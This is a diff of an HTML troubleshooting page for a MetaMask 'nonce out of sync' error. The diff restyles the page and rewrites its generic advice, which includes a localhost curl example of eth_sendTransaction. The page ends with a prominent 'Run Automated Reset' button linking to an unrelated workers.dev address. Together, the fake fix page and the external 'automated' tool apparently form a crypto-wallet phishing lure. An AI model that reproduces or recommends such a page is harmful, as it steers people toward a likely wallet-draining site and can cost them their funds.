@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: sans-serif;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff9455;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,30 +41,31 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum network.</li>
+<li>The user encounters a "nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the expected nonce value and the actual nonce value stored in the user's MetaMask wallet. This can happen when a transaction is sent but not confirmed, or when a user has multiple wallets or devices with different nonce values.</li>
+<li>This error occurs when the nonce (a counter that prevents transaction replay) stored in MetaMask does not match the nonce expected by the Ethereum network for the user's account. This discrepancy can happen due to cancelled, pending, or stuck transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in MetaMask to resync the nonce.</li>
-<li>Use the Ethereum JSON-RPC <code>eth_getTransactionCount</code> method to manually retrieve the current nonce value.</li>
-<li>Update the nonce value in MetaMask using the following code:</li>
+<li>To resolve the issue, the user can try the following:</li>
+<li>Resetting the account in MetaMask to resync the nonce.</li>
+<li>Manually adjusting the nonce in the transaction settings.</li>
+<li>Using the <code>eth_sendTransaction</code> method with a custom nonce value, as shown in the following code block:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="o">({</span>
-<span class="w">  </span><span class="s2">&quot;from&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...your_address&quot;</span>,
-<span class="w">  </span><span class="s2">&quot;nonce&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...new_nonce_value&quot;</span>
-<span class="o">})</span>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;value&quot;:&quot;0x...&quot;,&quot;gas&quot;:&quot;0x...&quot;,&quot;gasPrice&quot;:&quot;0x...&quot;,&quot;nonce&quot;:&quot;0x...&quot;}],&quot;id&quot;:1}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced debugging and troubleshooting capabilities. </p>
+<p>Consider utilizing an external console for more complex transaction management.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of Ethereum and MetaMask</li>
-<li>Access to the Ethereum network via a node or provider</li>
-<li>The ability to send transactions using Ethereum JSON-RPC methods</li>
+<li>MetaMask installed and configured.</li>
+<li>Ethereum node or provider (e.g., Infura) available.</li>
+<li>Basic understanding of Ethereum transactions and nonces.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
